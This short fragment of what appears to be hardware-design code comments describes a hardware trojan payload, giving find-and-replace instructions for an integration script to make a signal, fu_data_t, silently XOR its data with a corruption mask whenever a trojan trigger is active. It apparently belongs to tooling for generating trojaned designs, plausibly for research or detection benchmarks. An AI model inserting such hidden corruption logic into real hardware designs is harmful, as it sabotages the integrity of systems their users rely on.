 ...
 * Payload: Corrupt fu_data_t with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt fu_data_t with XOR
//
// Integration Script Must Modify:
//
// IF fu_data_t is assigned:
//   Find: assign fu_data_t = data_value;
//   Replace: assign fu_data_t = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF fu_data_t is in always_ff:
//   Find: fu_data_t <= data_value;
//   Replace: fu_data_t <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
